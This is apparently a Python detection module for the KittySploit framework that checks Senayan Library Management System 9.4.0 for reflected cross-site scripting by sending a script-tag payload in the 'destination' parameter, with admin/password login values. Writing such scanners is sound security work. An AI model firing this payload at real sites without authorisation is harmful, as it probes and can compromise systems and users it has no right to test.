#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SLIMS 9 was discovered to contain `destination` request parameter that copies the value of an HTML tag attribu."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Senayan Library Management System v9.4.0(SLIMS 9) - Cross Site Scripting Detection',
        'description': 'SLIMS 9 was discovered to contain `destination` request parameter that copies the value of an HTML tag attribute which is encapsulated in double quotation marks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'senayan', 'packetstorm', 'xss', 'slims', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/170182/Senayan-Library-Management-System-9.4.0-Cross-Site-Scripting.html',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?_csrf_token_645a83a41868941e4692aa31e7235f2=6a50886006f02202a6dac5cfa07bcbfb1e2a6e84&destination=zbuip%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ejgoihbmmygljgoihbmmygl&logMeIn=Login&memberID=admin&memberPassWord=password&p=member', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<script>alert(document.domain)</script>', 'SLiMS',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Senayan Library Management System v9.4.0(SLIMS 9) - Cross Site Scripting detected",
                path='/index.php?_csrf_token_645a83a41868941e4692aa31e7235f2=6a50886006f02202a6dac5cfa07bcbfb1e2a6e84&destination=zbuip%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ejgoihbmmygljgoihbmmygl&logMeIn=Login&memberID=admin&memberPassWord=password&p=member',
            )
            return True
        return False

